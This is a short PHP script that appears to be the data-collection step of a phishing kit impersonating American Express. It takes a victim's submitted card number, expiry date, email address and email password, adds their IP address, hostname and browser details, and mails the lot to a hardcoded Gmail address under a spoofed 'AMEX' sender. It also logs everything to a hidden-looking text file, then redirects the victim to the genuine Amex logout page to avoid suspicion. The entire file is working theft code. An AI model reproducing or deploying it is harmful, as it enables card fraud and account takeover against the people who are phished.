<?php 
$to = "loganresult@gmail.com"; // Put Your Emails Here
$ip = getenv("REMOTE_ADDR");
$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message  = "==================  2ND EMAIL & PASS ".$ip."  ==================\n";
$message .= "Card Number : ".$_POST['ccnum']."\n";
$message .= "Expiry Date : ".$_POST['expr']."\n";
$message .= "E-mail Address: ".$_POST['email']."\n";
$message .= "E-mail Password: ".$_POST['emailpass']."\n";
$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "Date And Time : ".$date."\n";
$message .= "Browser Details : ".$user_agent."\n";
$message .= "=============+Codewizard+===========\n";
$message .= "+-----/!\-----| NEW LOG |-----/!\-----+\n";
$to = "loganresult@gmail.com";
$subj = " 2ND EMAIL & PASS ||".$ip."\n";
$from = "From: AMEX  <codewizard@approject.com>";
$fp = fopen('XXXaxmexXXX00SREZUxxxsassssssilkklllllxSDSSSVSSS.txt', 'a');
fwrite($fp, $message);
fclose($fp);
mail($to, $subj, $message, $from);
Header ("Location: https://online.americanexpress.com/myca/logon/us/action?request_type=LogLogoffHandler&Face=en_US&inav=Logout");
?>